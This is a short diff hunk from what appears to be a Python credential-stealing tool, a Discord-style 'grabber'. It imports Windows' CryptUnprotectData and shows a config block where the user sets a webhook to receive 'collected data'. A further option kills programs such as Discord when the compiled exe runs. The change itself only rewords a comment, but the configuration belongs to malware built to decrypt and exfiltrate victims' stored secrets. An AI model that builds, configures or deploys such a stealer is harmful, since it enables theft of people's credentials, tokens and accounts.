@@ -25,7 +25,7 @@ from win32crypt import CryptUnprotectData
 
 
 config = {
-    # Replace WEBHOOK_HERE with your own webhook. The collected data will be sent to this webhook. ↓↓
+    # Replace YOUR_WEBHOOK_HERE with your own webhook. The collected data will be sent to this webhook. 
     'webhook': "YOUR_WEBHOOK_HERE",
     # Set to False if you don't want it to kill programs such as discord upon running the exe.
     'kill_processes': True,
